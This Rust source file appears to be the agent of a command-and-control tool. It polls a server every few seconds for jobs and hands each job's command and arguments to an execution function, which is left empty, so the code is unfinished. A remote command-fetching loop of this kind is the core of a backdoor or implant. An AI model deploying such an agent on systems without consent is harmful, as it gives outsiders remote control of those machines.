use std::{thread::sleep, time::Duration};
use ureq::agent;
use uuid::Uuid;
use common::api;
use crate::consts;
use std::process::Command;

pub fn run(api_client: &ureq::Agent, agent_id: Uuid) -> ! {
    let sleep_for = Duration::from_secs(3);
    let get_job_route = format!("{}/api/agents/{}/job", consts::SERVER_URL, agent_id);
    let post_job_result_route = format!("{}/api/jobs/result", consts::SERVER_URL);

    loop {
        let server_res = match api_client.get(get_job_route.as_str()).call() {
            Ok(res) => res,
            Err(err) => {
                log::debug!("Error getting job from the server: {}", err);
                sleep(sleep_for);
                continue;
            }
        };

        let api_res: api::Response<api::AgentJob> = match server_res.into_json() {
            Ok(res) => res,
            Err(err) => {
                log::debug!("Error parsing JSON: {}", err);
                sleep(sleep_for);
                continue;
            }
        };

        log::debug!("API response successfully received! Yay!");

        let job = match api_res.data {
            Some(job) => job,
            None => {
                log::debug!("No job found. Trying again in a few seconds! {:?}", sleep_for);
                sleep(sleep_for);
                continue;
            }
        };
        
        let output = execute_command(job.command, job.args);
    }
}

fn execute_command(command: String, args: Vec<String>) -> String {
    
}